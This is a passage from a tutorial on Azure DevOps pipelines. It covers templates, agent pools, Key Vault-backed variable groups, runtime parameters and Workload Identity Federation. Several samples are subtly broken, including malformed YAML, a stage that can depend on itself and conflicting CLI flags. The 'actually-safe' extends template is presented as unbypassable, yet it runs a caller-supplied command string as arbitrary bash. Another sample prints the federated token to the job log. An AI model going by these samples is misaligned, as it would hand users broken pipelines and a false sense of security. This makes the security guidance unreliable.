  inputs: {command: publish, publishDirectory: dist/, vstsFeedPublish: shop,
           vstsFeedPackagePublish: shop-api, versionOption: custom,
           packageVersion: '$(Build.BuildNumber)'}
- task: Npm@1
  inputs: {command: publish, workingDir: apps/shop-ui, publishRegistry: useFeed, vstsFeed: shop}
- task: Maven@4
  inputs: {mavenPomFile: apps/shop-api/pom.xml, goals: deploy, publishJUnitResults: true,
           testResultsFiles: '**/surefire-reports/TEST-*.xml', javaHomeOption: JDKVersion,
           jdkVersionOption: '1.21', mavenAuthenticateFeed: true, effectivePomSkip: true}
- task: NuGetAuthenticate@1               # ⭐ authenticates to Azure Artifacts feeds
  inputs: {nuGetServiceConnections: shop-azdo-conn}
- task: DotNetCoreCLI@2
  inputs: {command: push, packagesToPush: '**/*.nupkg', publishVstsFeed: shop}

# ── security ⭐ ──────────────────────────────────────────────────
- task: ComponentGovernanceComponentDetection@0     # ⭐ dependency scanning
  inputs: {scanType: 'Register', verbosity: 'Detailed', alertWarningLevel: 'High',
           failOnAlert: true}
- task: CredScan@3                                 # ⭐ the classic credential scanner
  inputs: {toolMajorVersion: 'V2', scanFolder: $(System.DefaultWorkingDirectory)}
- task: PostAnalysis@2
  inputs: {ToolLogsNotFoundAction: 'Standard', GdnExportAllTools: true}
- task: PoliCheck@2
  inputs: {inputType: 'Basic', targetType: 'Basic', targetFolder: $(System.DefaultWorkingDirectory)}
- task: SdtReport@2                                # the security report
- task: PublishSecurityAnalysisLogs@3
```

---

## 3 · Templates — the reusable layer ⭐⭐

Templates are Azure DevOps' answer to "how do I stop 40 teams from writing 40 different pipelines?" There are three kinds, and knowing which to use is the senior skill.

### 3.1 The three kinds

| Kind | Syntax | What it does | Use for |
|---|---|---|---|
| **Insertion** (`template:`) | `- template: x.yml` | ⭐ Textually inserts the template's steps/jobs at that point | Reusing a block of steps |
| **`extends`** ⭐⭐ | `extends: template: x.yml` | The **template owns the pipeline**; the caller only supplies approved parameters | ⭐ **Security** — the platform team controls what can run |
| **Parameterised function** | `${{ each }}`, `${{ if }}` | Compile-time loops and conditionals | Generating repetitive YAML |

### 3.2 Insertion templates

```yaml
# .pipelines/templates/build-image.yml — ⭐ a reusable STEP template
parameters:
  - name: service
    type: string
  - name: dockerfile
    type: string
    default: Dockerfile
  - name: registry
    type: string
    default: ghcr.io/3558bhk
  - name: extraBuildArgs
    type: object
    default: []
  - name: scan
    type: boolean
    default: true

steps:
  - bash: |
      set -euo pipefail
      IMAGE="${{ parameters.registry }}/${{ parameters.service }}"
      TAG="$(Build.SourceVersion)"
      echo "==> building $IMAGE:$TAG"
      docker buildx create --use --name b 2>/dev/null || docker buildx use b
      docker buildx build "apps/${{ parameters.service }}" \
        --file "apps/${{ parameters.service }}/${{ parameters.dockerfile }}" \
        --tag "$IMAGE:$TAG" --tag "$IMAGE:latest" \
        --cache-from "type=registry,ref=$IMAGE:buildcache" \
        --cache-to   "type=registry,ref=$IMAGE:buildcache,mode=max" \
        --provenance=mode=max --sbom=true \
        ${{ each arg in parameters.extraBuildArgs }}--build-arg ${{ arg }} ${{ end }} \
        --push
      DIGEST=$(docker buildx imagetools inspect "$IMAGE:$TAG" --format '{{json .Manifest}}' | jq -r .digest)
      echo "$DIGEST" > "$(Build.ArtifactStagingDirectory)/${{ parameters.service }}.digest"
      echo "##vso[task.setvariable variable=${{ parameters.service }}Digest;isOutput=true]$DIGEST"
      echo "✅ $IMAGE@$DIGEST"
    name: build
    displayName: 'Build and push ${{ parameters.service }}'

  - ${{ if eq(parameters.scan, true) }}:
      - bash: |
          set -euo pipefail
          IMAGE="${{ parameters.registry }}/${{ parameters.service }}:$(Build.SourceVersion)"
          trivy image --exit-code 1 --severity CRITICAL,HIGH \
            --ignore-unfixed --format table --scanners vuln,secret,misconfig "$IMAGE"
          trivy image --format cyclonedx --output "$(Build.ArtifactStagingDirectory)/${{ parameters.service }}.sbom.cdx.json" "$IMAGE"
        displayName: 'Scan ${{ parameters.service }}'
```

```yaml
# .pipelines/templates/build-job.yml — ⭐ a reusable JOB template
parameters:
  - name: service
    type: string
  - name: language
    type: string
    values: [java, go, python, node]
  - name: timeoutInMinutes
    type: number
    default: 20
  - name: vmImage
    type: string
    default: ubuntu-latest

jobs:
  - job: Build_${{ replace(parameters.service, '-', '_') }}
    displayName: '🏗️ ${{ parameters.service }}'
    timeoutInMinutes: ${{ parameters.timeoutInMinutes }}
    pool: {vmImage: ${{ parameters.vmImage }}
    steps:
      - checkout: self
        fetchDepth: 1

      - ${{ if eq(parameters.language, 'java') }}:
          - task: JavaToolInstaller@0
            inputs: {versionSpec: '21', jdkArchitectureOption: x64, jdkSourceOption: PreInstalled}
          - task: Cache@2
            inputs:
              key: 'maven | "$(Agent.OS)" | apps/${{ parameters.service }}/pom.xml'
              path: $(Pipeline.Workspace)/.m2
              cacheHitVar: MAVEN_CACHE_RESTORED
          - bash: mvn -B -Dmaven.repo.local=$(Pipeline.Workspace)/.m2 verify
            workingDirectory: apps/${{ parameters.service }}

      - ${{ if eq(parameters.language, 'go') }}:
          - task: GoTool@0
            inputs: {version: '1.23'}
          - bash: |
              go mod download && go test ./... -race -coverprofile=cover.out -covermode=atomic
              CGO_ENABLED=0 GOOS=linux go build -trimpath -ldflags="-s -w" -o bin/app .
            workingDirectory: apps/${{ parameters.service }}

      - ${{ if eq(parameters.language, 'python') }}:
          - task: UsePythonVersion@0
            inputs: {versionSpec: '3.13', addToPath: true}
          - bash: |
              pip install -r requirements.txt -r requirements-dev.txt
              ruff check . && ruff format --check .
              pytest -n auto --junitxml=pytest.xml --cov --cov-report=xml
            workingDirectory: apps/${{ parameters.service }}

      - ${{ if eq(parameters.language, 'node') }}:
          - task: NodeTool@0
            inputs: {versionSpec: '22.x'}
          - bash: |
              npm ci
              npm run lint && npm run test -- --coverage --reporter=junit
              npm run build
            workingDirectory: apps/${{ parameters.service }}

      - ${{ if in(parameters.language, 'java', 'python', 'node') }}:
          - task: PublishTestResults@2
            condition: always()
            inputs:
              testResultsFormat: JUnit
              testResultsFiles: 'apps/${{ parameters.service }}/**/*.xml'
              mergeTestResults: true
              failTaskOnFailedTests: true
              testRunTitle: '${{ parameters.service }} unit tests'

      - template: build-image.yml@self
        parameters:
          service: ${{ parameters.service }}
```

```yaml
# ⭐ using them
jobs:
  - template: .pipelines/templates/build-job.yml
    parameters: {service: shop-api, language: java}
  - template: .pipelines/templates/build-job.yml
    parameters: {service: checkout, language: go}
  - template: .pipelines/templates/build-job.yml
    parameters: {service: order-worker, language: python}
  - template: .pipelines/templates/build-job.yml
    parameters: {service: shop-ui, language: node, timeoutInMinutes: 30}
```

### 3.3 `extends` templates ⭐⭐ the security pattern

This is the pattern Microsoft uses internally (the "1ES templates") and it's the right answer for a platform team.

**The difference:** with `template:`, the *caller* owns the pipeline and can add any steps. With `extends:`, the **template owns the pipeline** and the caller may only fill in approved slots. A team cannot add a step that exfiltrates secrets, because the template never gives them a raw `steps:` list.

```yaml
# .pipelines/templates/secure-pipeline.yml — ⭐ the template OWNS the pipeline
parameters:
  - name: service
    type: string
  - name: language
    type: string
    values: [java, go, python, node]
  - name: buildSteps                       # ⭐ the ONLY slot the caller gets
    type: stepList
    default: []
  - name: deployToProduction
    type: boolean
    default: true
  - name: additionalTestSteps
    type: stepList
    default: []

# ⭐⭐ the template declares the resources — the caller can't add any
resources:
  repositories:
    - repository: self

extends:
  template: .pipelines/templates/_base.yml@self    # (or a resource repo)

stages:
  - stage: CI
    jobs:
      - job: Lint
        steps:
          - checkout: self
          - bash: ./ci/lint.sh                      # ⭐ the template's own step
          - ${{ parameters.buildSteps }}             # ⭐ wait, that's unsafe — see below

# ⛔ the naive version above is STILL unsafe: the caller can put anything in buildSteps.
# ✅ the SAFE version: the caller supplies PARAMETERS, not steps.
```

```yaml
# ⭐⭐ THE ACTUALLY-SAFE extends TEMPLATE
parameters:
  - name: service
    type: string
  - name: language
    type: string
    values: [java, go, python, node]        # ⭐ CONSTRAINED — can't be anything else
  - name: testCommand
    type: string                            # ⭐ a string, not a stepList
  - name: coverageFile
    type: string
    default: ''
  - name: environments
    type: object
    default: [dev, staging, production]
  - name: maxCriticalVulnerabilities
    type: number
    default: 0

# ⭐ the template controls the pool, the resources, the security steps, the gates.
pool:
  name: shop-secured-pool                    # ⭐ a pool the caller cannot change
  demands: [secure-network]

steps: []                                     # ⭐ the caller CANNOT inject steps

stages:
  - stage: Verify
    jobs:
      - job: Build
        steps:
          - checkout: self
            fetchDepth: 1
          - template: .pipelines/templates/security-scans.yml@self   # ⭐ always runs
          - bash: ${{ parameters.testCommand }}       # ⭐ a string, run in a sandbox
            workingDirectory: apps/${{ parameters.service }}
            displayName: ${{ parameters.language }} tests
          - ${{ if ne(parameters.coverageFile, '') }}:
              - task: PublishCodeCoverageResults@2
                inputs: {summaryFileLocation: 'apps/${{ parameters.service }}/${{ parameters.coverageFile }}'}
          - task: ComponentGovernanceComponentDetection@0
            inputs: {failOnAlert: true, alertWarningLevel: 'High'}
          - bash: |
              set -euo pipefail
              IMAGE="ghcr.io/3558bhk/${{ parameters.service }}"
              docker buildx build "apps/${{ parameters.service }}" \
                --tag "$IMAGE:$(Build.SourceVersion)" --sbom --provenance=mode=max --push
              CRIT=$(trivy image --severity CRITICAL --quiet --format json "$IMAGE:$(Build.SourceVersion)" \
                     | jq '[.Results[].Vulnerabilities[]?] | length')
              echo "critical vulnerabilities: $CRIT"
              if (( CRIT > ${{ parameters.maxCriticalVulnerabilities }} )); then
                echo "##vso[task.logissue type=error]$CRIT critical vulnerabilities (max ${{ parameters.maxCriticalVulnerabilities }})"
                exit 1
              fi
            displayName: Build, scan and gate on vulnerabilities

  - ${{ each env in parameters.environments }}:
      - stage: Deploy_${{ env }}
        displayName: '🚀 ${{ env }}'
        dependsOn: ${{ if eq(env, 'dev') }}: Verify ${{ else }}: Deploy_${{ env }} ${{ end }}
        condition: succeeded()
        jobs:
          - deployment: Deploy
            environment: ${{ env }}            # ⭐⭐ the approval gate for production
            strategy:
              runOnce:
                deploy:
                  steps:
                    - bash: ./scripts/deploy.sh ${{ env }} $(Build.SourceVersion)
```

```yaml
# ⭐⭐ what a TEAM writes — 12 lines, and they cannot bypass any of the controls
# apps/shop-api/azure-pipelines.yml
extends:
  template: .pipelines/templates/secure-pipeline.yml@self
  parameters:
    service: shop-api
    language: java                       # ⭐ must be one of the four allowed values
    testCommand: 'mvn -B verify'
    coverageFile: 'target/site/jacoco/jacoco.xml'
    environments: [dev, staging, production]
    maxCriticalVulnerabilities: 0
```

> 🔑 **Why `extends` is the answer for a platform team:** the app team can change *what is built and tested*, but not *where it runs*, not *what security steps execute*, not *which pool it uses*, and not *whether there's an approval gate*. That's real policy-as-code. The equivalent in GitHub Actions is a **reusable workflow** with typed inputs; the equivalent in Jenkins is a **shared library** with a `call()` that the team's Jenkinsfile invokes.

### 3.4 Template expressions — loops and conditionals

```yaml
parameters:
  - name: services
    type: object
    default:
      - {name: shop-api,     lang: java,   port: 8080}
      - {name: checkout,     lang: go,     port: 8080}
      - {name: order-worker, lang: python, port: 9092}
      - {name: shop-ui,      lang: node,   port: 8080}
  - name: environments
    type: object
    default: [dev, staging]
  - name: runNightly
    type: boolean
    default: false

# ⭐ a compile-time loop over a list of objects → a job per service
jobs:
  - ${{ each svc in parameters.services }}:
      - job: Test_${{ replace(svc.name, '-', '_') }}
        displayName: '🧪 ${{ svc.name }} (${{ svc.lang }})'
        pool: {vmImage: ubuntu-latest}
        variables:
          SERVICE: ${{ svc.name }}
          PORT: ${{ svc.port }}
        steps:
          - checkout: self
          - bash: ./ci/test-${{ svc.lang }}.sh $(SERVICE)
          - publish: apps/${{ svc.name }}/reports
            artifact: reports-${{ svc.name }}
            condition: always()

# ⭐ a nested loop: environment × service
  - ${{ each env in parameters.environments }}:
      - ${{ each svc in parameters.services }}:
          - job: Deploy_${{ env }}_${{ replace(svc.name, '-', '_') }}
            displayName: '🚀 ${{ svc.name }} → ${{ env }}'
            dependsOn: Test_${{ replace(svc.name, '-', '_') }}
            steps:
              - bash: ./scripts/deploy-one.sh ${{ env }} ${{ svc.name }}

# ⭐ a compile-time conditional
  - ${{ if eq(parameters.runNightly, true) }}:
      - job: DeepScan
        steps: [{bash: ./ci/deep-scan.sh}]

# ⭐ compile-time functions
variables:
  # ${{ }} functions available: and, or, not, xor, eq, ne, gt, ge, lt, le,
  #   in, notIn, contains, startsWith, endsWith, coalesce, length, count,
  #   join, replace, insert, union, lower, upper, format
  buildSlug: ${{ replace(lower(variables.service), ' ', '-') }}
```

### 3.5 Template repositories

```yaml
# ⭐ templates in a SEPARATE, versioned repository — the platform team owns it
resources:
  repositories:
    - repository: templates
      type: github
      name: 3558Bhk/pipeline-templates
      ref: refs/tags/v2.3.1               # ⭐⭐ A TAG or a SHA, never a branch
      endpoint: github-shop               # ⭐ a GitHub service connection
    - repository: azdo-templates
      type: git
      name: Platform/pipeline-templates    # an Azure DevOps repo in another project
      ref: refs/tags/v2.3.1

# reference them with @<repositoryAlias>
extends:
  template: secure-pipeline.yml@templates
  parameters: {service: shop-api, language: java, testCommand: 'mvn -B verify'}
```

⚠️ **The template repo's `ref` must be pinned.** `ref: refs/heads/main` means anyone who can push to the templates repo can change what every pipeline in the organisation does — with their secrets in scope. Pin to a tag, and require a PR + review to move the tag.

---

## 4 · Agents and pools

### 4.1 The concepts

```
AGENT POOL      a named set of agents            ("shop-hosted", "shop-vmss", "gpu-agents")
AGENT           one machine/container/VM that runs jobs
DEMAND          a label an agent advertises      (agent demands: docker, gpu, linux-x64)
JOB AUTHORIZATION  which pools a pipeline may use  ⭐ Project Settings → Agent queues
PARALLEL JOBS   how many jobs may run at once     ⭐ this is what you pay for
```

### 4.2 A self-hosted agent on a VM

```bash
# ── 1. create the pool ───────────────────────────────────────────
# Project Settings → Agent pools → Add pool → Self-hosted → name: shop-agents
# ⭐ or via the REST API:
PAT=$(az pipelines list -o tsv --query '[0].id' >/dev/null; echo "$AZURE_DEVOPS_EXT_PAT")
ORG=https://dev.azure.com/shop-devops
curl -s -u ":$PAT" -XPOST "$ORG/_apis/distributedtask/pools?api-version=7.1" \
  -H 'Content-Type: application/json' \
  -d '{"name":"shop-agents","autoProvisionProjectPools":true,"isHosted":false}' | jq .

# ── 2. get the registration token (valid 1 hour) ─────────────────
POOL_ID=$(curl -s -u ":$PAT" "$ORG/_apis/distributedtask/pools?api-version=7.1" \
          | jq -r '.value[] | select(.name=="shop-agents") | .id')
TOKEN=$(curl -s -u ":$PAT" -XPOST \
  "$ORG/_apis/distributedtask/pools/$POOL_ID/registrationtoken?api-version=7.1" | jq -r .value)

# ── 3. install on the machine ⭐ (Ubuntu 24.04) ──────────────────
sudo apt-get update && sudo apt-get install -y curl git jq unzip docker.io
sudo usermod -aG docker $USER

mkdir -p ~/agent && cd ~/agent
curl -o agent.tar.gz -L \
  https://vstsagentpackage.azureedge.net/agent/3.250.0/vsts-agent-linux-x64-3.250.0.tar.gz
tar xzf agent.tar.gz

./config.sh --unattended \
  --url "$ORG" \
  --auth pat --token "$TOKEN" \
  --pool shop-agents \
  --agent "$(hostname)-agent" \
  --work _work \
  --acceptTeeEula \
  --replace \
  --alwaysExtractTask

# ⭐ advertise DEMANDS so jobs can select this agent
./config.sh --addagentdemands docker,gpu,java21,maven

# ── 4. run it ────────────────────────────────────────────────────
./run.sh                                    # foreground — watch the logs
# or as a systemd service:
sudo ./svc.sh install $USER                 # ⭐ run as YOUR user, not root,
sudo ./svc.sh start                         #   so it can use your docker group
sudo ./svc.sh status
./config.sh remove --token "$TOKEN"         # deregister
```

```yaml
# ⭐ use it in a pipeline
pool:
  name: shop-agents
  demands:
    - docker                            # ⭐ only agents advertising `docker`
    - java21
jobs:
  - job: Build
    steps: [{bash: docker version && java -version}]
```

### 4.3 Agents in containers (ephemeral, the modern pattern)

```bash
# ⭐ run the agent as a container — one agent per job, nothing persists
docker run -d --name azp-agent \
  -e AZP_URL=https://dev.azure.com/shop-devops \
  -e AZP_TOKEN="$TOKEN" \
  -e AZP_POOL=shop-agents \
  -e AZP_AGENT_NAME="$(hostname)-docker-1" \
  -v /var/run/docker.sock:/var/run/docker.sock \
  mcr.microsoft.com/azure-pipelines/vsoagent:ubuntu-24.04-docker

# ⭐ the "one agent, one job, then die" pattern
docker run --rm \
  -e AZP_URL=… -e AZP_TOKEN=… -e AZP_POOL=… \
  -e AZP_AGENT_NAME="ephemeral-$(date +%s)" \
  mcr.microsoft.com/azure-pipelines/vsoagent:ubuntu-24.04
# AZP_TOKEN here should be a JOB-SCOPED token, obtained from:
curl -s -u ":$PAT" -XPOST "$ORG/_apis/distributedtask/pools/$POOL_ID/jobrequests?api-version=7.1"
```

### 4.4 Azure VMSS agent pools ⭐ the autoscaling answer

```
Project Settings → Agent pools → Add pool → ⭐ Virtual machine scale set
  · Azure subscription:    shop-wif
  · VMSS:                  vmss-shop-agents
  · OS:                    Linux (from a custom image with your toolchain baked in)
  · Agent pool service:    a managed identity with VMSS Contributor
  · Max agents:            20
  · ⭐ Idle time:          15 minutes (then scale down)
  · ⭐ Time to extend:     30 minutes (a job may extend an agent's life)
  · OS disk:               ephemeral
  · Reimage after every use: ⭐ ON  (the security win)
```

```bicep
// infra/agents.bicep — the VMSS with a custom image
@description('The agent image, built by Packer with the toolchain baked in')
param agentImageId string
param instanceCount int = 2
param vmSku string = 'Standard_D4s_v5'

resource vmss 'Microsoft.Compute/virtualMachineScaleSets@2024-07-01' = {
  name: 'vmss-shop-agents'
  location: resourceGroup().location
  sku: {name: vmSku, tier: 'Standard', capacity: instanceCount}
  properties: {
    upgradePolicy: {mode: 'Rolling'}
    virtualMachineProfile: {
      storageProfile: {
        imageReference: {id: agentImageId}
        osDisk: {createOption: 'FromImage', caching: 'ReadWrite',
                 managedDisk: {storageAccountType: 'Premium_LRS'},
                 diffDiskSettings: {option: 'Local'}}   // ⭐ ephemeral OS disk
      }
      osProfile: {
        computerNamePrefix: 'azagent'
        adminUsername: 'azureuser'
        linuxConfiguration: {disablePasswordAuthentication: true,
                             ssh: {publicKeys: [{path: '/home/azureuser/.ssh/authorized_keys',
                                                 keyData: loadTextContent('id_rsa.pub')}]}}
      }
      networkProfile: {
        networkInterfaceConfigurations: [{
          name: 'nic'
          properties: {
            primary: true
            ipConfigurations: [{name: 'ipconfig',
              properties: {subnet: {id: subnetId}}}]
          }
        }]
      }
      extensionProfile: {
        extensions: [{
          name: 'AzureDevOpsAgent'
          properties: {
            publisher: 'Microsoft.Azure.DevOps', typeHandlerVersion: '1.0',
            autoUpgradeMinorVersion: true,
            settings: {VSTSAccountName: 'shop-devops', TeamProject: 'Shop',
                       PoolName: 'shop-vmss', EnableMetrics: true}
          }
        }]
      }
    }
  }
  identity: {type: 'UserAssigned',
             userAssignedIdentities: {'${miId}': {}}}
}
```

```bash
# the Packer image — bake the toolchain so agents start ready
packer init packer/agents.pkr.hcl
packer build packer/agents.pkr.hcl
# and it installs: docker, buildx, java 21, maven, go 1.23, node 22, python 3.13,
#                  kubectl, helm, kustomize, trivy, cosign, az, gh, jq, yq
```

### 4.5 Agent troubleshooting

```bash
# where is my job stuck?
# Pipelines → the run → the job shows "Queued" with a reason:
#   "Waiting for an agent which matches all specified demands"  → no agent has the demands
#   "No agent found in the pool with the required capabilities"
#   "All agents are busy"                                        → you need more parallel jobs
#   "The pipeline must be authorized to use this agent pool"     → ⭐ Job authorization

# ⭐ JOB AUTHORIZATION SCOPE — the #1 cause of "queued forever"
# Project Settings → Pipelines → Pipeline permissions → Agent queues
#   → ⋯ on shop-agents → Security → add the pipeline (or the Build Service group)
# or in the YAML:
resources:
  queues:
    - queue: shop-agents

# the agent's own logs
cd ~/agent/_diag
ls -lt | head            # Agent_2026*.log, Worker_2026*.log
tail -100 Agent_*.log
tail -100 Worker_*.log
./config.sh --diagnostics    # ⭐ collects everything into a zip

# common agent failures
# 1. "Unable to connect"     → a proxy. Set HTTPS_PROXY in the agent env.
# 2. "No space left"         → the _work directory fills up. `workspace: clean: all`
#                              + a scheduled cleanup cron.
# 3. job hangs at 99%        → a background process didn't exit. `trap 'kill 0' EXIT`
#                              in your scripts, or set `cancelTimeoutInMinutes`.
# 4. Docker permission denied → the agent service runs as a user not in the docker group
# 5. the agent goes offline after a reboot → `sudo ./svc.sh install` didn't persist;
#                              check systemctl status vsts.agent.*
```

---

## 5 · Variables, variable groups and Key Vault

### 5.1 The precedence ladder ⭐

```
lowest  →  highest

1. a variable group linked to the RELEASE/pipeline (Library)
2. a variable group linked at the pipeline level
3. `variables:` in the YAML
4. a variable defined on the pipeline in the UI (Pipelines → Edit → Variables)
5. ⭐ runtime parameters (`parameters:` prompted at queue time)
6. `##vso[task.setvariable]` set during the run
7. environment variables set on the step itself (`env:`)
```

```yaml
variables:
  # ⭐ a variable group (may hold secrets)
  - group: shop-common
  # ⭐ a Key Vault-backed group (secrets fetched at runtime, never stored here)
  - group: shop-production-keyvault
  # ⭐ a group scoped to a specific stage
  - name: LOG_LEVEL
    value: debug
    # scope rules: a variable can be marked "keep this value read-only"
  - template: .pipelines/variables/common.yml      # ⭐ variables from a template
  - group: ${{ parameters.vgName }}                # ⭐ a dynamic group name (compile-time)

# per-stage variables
stages:
  - stage: Deploy
    variables:
      - group: shop-${{ parameters.env }}           # ⭐ dev / staging / production
```

```bash
# create and manage variable groups from the CLI
az pipelines variable-group create --name shop-common \
  --variables "REGISTRY=ghcr.io/3558bhk" "HELM_CHART_PATH=helm/shop" "LOG_LEVEL=info" \
  --project Shop --authorize true
VG_ID=$(az pipelines variable-group list --project Shop --query "[?name=='shop-common'].id" -o tsv)
az pipelines variable-group variable create --group-id $VG_ID \
  --name DB_PASSWORD --value 's3cret' --secret true --project Shop
az pipelines variable-group variable update --group-id $VG_ID --name LOG_LEVEL --value warn
az pipelines variable-group variable list --group-id $VG_ID -o table
az pipelines variable-group variable delete --group-id $VG_ID --name OLD --yes

# ⭐ authorize the variable group for a pipeline (or it's invisible)
az pipelines variable-group update --id $VG_ID --project Shop
# Project Settings → Pipelines → Library → shop-common → Pipeline permissions → +
```

### 5.2 The Key Vault-backed variable group ⭐⭐

**Secrets live in Key Vault. Azure DevOps holds only a reference.** Nothing is stored in Azure DevOps, rotation is instant, and Key Vault's access policy is the single place to audit.

```bash
# 1. the Key Vault
az keyvault create --name kv-shop-devops --resource-group rg-shop --location centralindia \
  --sku standard --enable-rbac-authorization true
az keyvault secret set --vault-name kv-shop-devops --name DB-PASSWORD --value 's3cret'
az keyvault secret set --vault-name kv-shop-devops --name SLACK-WEBHOOK --value 'https://hooks.slack.com/…'
az keyvault secret set --vault-name kv-shop-devops --name GHCR-TOKEN --value 'ghp_…'

# 2. ⭐ grant the Azure DevOps service principal "Key Vault Secrets User"
SP_OBJECT_ID=$(az devops service-endpoint azurerm show --id <conn-id> --project Shop \
               --query 'authorization.parameters.serviceprincipalid' -o tsv)
az role assignment create --role "Key Vault Secrets User" \
  --assignee-object-id "$SP_OBJECT_ID" --assignee-principal-type ServicePrincipal \
  --scope /subscriptions/$(az account show -q id -o tsv)/resourceGroups/rg-shop/providers/Microsoft.KeyVault/vaults/kv-shop-devops
# ⭐ scope it to the vault, not the subscription

# 3. the linked variable group (the UI: Library → + Variable group →
#    "Link secrets from an Azure key vault")
# or the REST API:
curl -s -u ":$PAT" -XPOST "$ORG/Shop/_apis/distributedtask/variablegroups?api-version=7.1" \
  -H 'Content-Type: application/json' -d '{
    "name": "shop-production-keyvault",
    "type": "AzureKeyVault",
    "description": "Production secrets, fetched at runtime from Key Vault",
    "providerData": "{\"subscriptionId\":\"<sub>\",\"resourceGroup\":\"rg-shop\",\"vaultName\":\"kv-shop-devops\"}",
    "authorization": {"resourceId":"<conn-id>","serviceEndpointId":"<conn-id>"},
    "variableGroupsProjectReferences": []
  }' | jq .
```

```yaml
# ⭐ use it exactly like any other variable
variables:
  - group: shop-production-keyvault
steps:
  - bash: |
      echo "the secret is masked in the log: $(DB-PASSWORD)"     # → ***
      # ⭐ but it IS available to the script:
      PGPASSWORD="$(DB-PASSWORD)" psql -h db -U shop -c 'SELECT 1'
  - task: AzureKeyVault@2               # ⭐ the alternative: fetch inside a job
    inputs:
      azureSubscription: shop-wif
      KeyVaultName: kv-shop-devops
      SecretsFilter: 'DB-PASSWORD,SLACK-WEBHOOK'
      RunAsPreJob: false
```

⚠️ **Key Vault secret names may only contain `a-z`, `A-Z`, `0-9` and `-`.** No underscores. `DB_PASSWORD` in Key Vault must be `DB-PASSWORD`, and in YAML you reference it as `$(DB-PASSWORD)`.

### 5.3 Runtime parameters — the typed prompt

```yaml
parameters:
  - name: environment
    displayName: 🌍 Target environment
    type: string
    default: dev
    values: [dev, staging, production]        # ⭐ a constrained choice

  - name: version
    displayName: 📦 Image tag (blank = this commit)
    type: string
    default: ''

  - name: skipTests
    displayName: ⚠️ Skip the test stage
    type: boolean
    default: false

  - name: logLevel
    type: string
    default: info
    values: [debug, info, warn, error]

  - name: services
    displayName: Which services to deploy
    type: object
    default:
      - shop-api
      - checkout
      - order-worker
      - shop-ui

  - name: approverNote
    displayName: Note for the approver
    type: string
    default: ''

trigger: none                                  # ⭐ parameters only prompt on manual runs
                                               #   unless you set them in `trigger` too

stages:
  - ${{ if eq(parameters.skipTests, false) }}:
      - stage: Test
        jobs: [{job: T, steps: [{bash: ./ci/test.sh}]}]

  - stage: Deploy
    ${{ if eq(parameters.skipTests, false) }}:
      dependsOn: Test
    jobs:
      - ${{ each svc in parameters.services }}:
          - deployment: Deploy_${{ replace(svc, '-', '_') }}
            environment: ${{ parameters.environment }}
            strategy:
              runOnce:
                deploy:
                  steps:
                    - bash: |
                        ./scripts/deploy-one.sh \
                          --env "${{ parameters.environment }}" \
                          --service "${{ svc }}" \
                          --version "${{ coalesce(parameters.version, '$(Build.SourceVersion)') }}" \
                          --log-level "${{ parameters.logLevel }}"
```

```bash
az pipelines run --id <id> --branch main \
  --parameters environment=staging version=1.4.2 skipTests=false logLevel=debug
```

---

## 6 · Service connections ⭐ including Workload Identity Federation

### 6.1 The types

| Type | For | Auth |
|---|---|---|
| **Azure Resource Manager** | ⭐ anything in Azure | **Workload Identity Federation** (recommended), Service principal (secret/certificate), Managed identity, Automatic |
| **GitHub** | a GitHub repo | GitHub App installation ⭐ or a PAT or OAuth |
| **Docker Registry** | ACR, GHCR, Docker Hub, any | username + password/token |
| **Generic** | any REST endpoint | token / basic / no auth |
| **Kubernetes** | a raw cluster | kubeconfig, a service account, or Azure |
| **SSH** | an SSH deploy | a key |
| **Npm / NuGet / Maven / Python** | Azure Artifacts feeds | automatic |
| **ServiceNow / Jira** | a change-management REST check | basic |
| **Azure DevOps** ⭐ new | cross-organisation repos, feeds, REST | Microsoft Entra **workload identity** — PAT-free |

### 6.2 Workload Identity Federation ⭐⭐ the zero-secret connection

```
Project Settings → Service connections → + New connection →
  Azure Resource Manager → Next →
  Authentication method: ⭐ "Workload identity federation (automatic)"
    → Azure DevOps creates an App Registration in your Entra tenant,
      adds a FEDERATED CREDENTIAL to it, and stores NOTHING secret.
  Subscription / Resource group → pick
  Service connection name: shop-wif
  ☑ Grant access permission to all pipelines   (or restrict — better)
```

**What actually gets created:**

```
Entra ID → App registrations → "shop-devops.Shop.shop-wif"
  → Certificates & secrets → ⭐ Federated credentials
      Name:            <guid>
      Issuer:          https://vstoken.actions.azure.com/<tenant-id>       (or the region-specific one)
      Subject identifier:  <org-uuid>/<project-uuid>/<scope>
      Audience:        api://AzureADTokenExchange
  → API permissions:  Azure Service Management → user_impersonation
  → Enterprise application → Role assignments on the subscription/RG
```

```bash
# ⭐ the SUBJECT IDENTIFIER is the security boundary. Understand its scopes:
#   organisation level:  <orgId>
#   project level:       <orgId>/<projectId>
#   pipeline level:      <orgId>/<projectId>/<pipelineId>
#   environment level:   <orgId>/<projectId>/<environmentName>
#
# The NARROWER the subject, the fewer things can use the connection.
# Project Settings → Service connections → shop-wif → "Workload identity federation"
# shows you the exact subject string to copy into a custom App Registration
# if you want to control it yourself ("manual" mode).

# MANUAL MODE — you create the App Registration and the federated credential
az ad sp create-for-rbac --name "shop-devops-manual" --role Contributor \
  --scopes /subscriptions/$SUB_ID/resourceGroups/rg-shop --skip-assignment
APP_ID=$(az ad sp list --display-name shop-devops-manual --query '[0].appId' -o tsv)
OBJ_ID=$(az ad sp show --id $APP_ID --query id -o tsv)

az ad app federated-credential create --id $APP_ID --parameters '{
  "name": "shop-devops-prod-env",
  "issuer": "https://vstoken.actions.azure.com/<tenant-id>",
  "subject": "<orgId>/<projectId>/production",
  "description": "Azure DevOps: Shop project, production environment only",
  "audiences": ["api://AzureADTokenExchange"]
}'
az ad app federated-credential list --id $APP_ID -o table

az role assignment create --role Contributor \
  --assignee-object-id $OBJ_ID --assignee-principal-type ServicePrincipal \
  --scope /subscriptions/$SUB_ID/resourceGroups/rg-shop

# then: Service connections → Azure Resource Manager →
#       "Workload identity federation (manual)" → paste tenant/app/subscription
```

```yaml
# ⭐ using it — identical to any other ARM connection
steps:
  - task: AzureCLI@2
    inputs:
      azureSubscription: shop-wif
      addSpnToEnvironment: true
      scriptType: bash
      scriptLocation: inlineScript
      inlineScript: |
        az account show -o table
        echo "the federated token is available as $idToken"
        # decode it to see the claims:
        echo "$idToken" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
        # {
        #   "iss": "https://vstoken.actions.azure.com/<tenant>",
        #   "sub": "<orgId>/<projectId>/production",     ← ⭐ the subject
        #   "aud": "api://AzureADTokenExchange",
        #   "exp": 1757499999,                            ← ⭐ 1 hour
        #   "oid": "<the app registration's object id>"
        # }
```

**Convert an existing secret-based connection — no pipeline changes needed:**

```
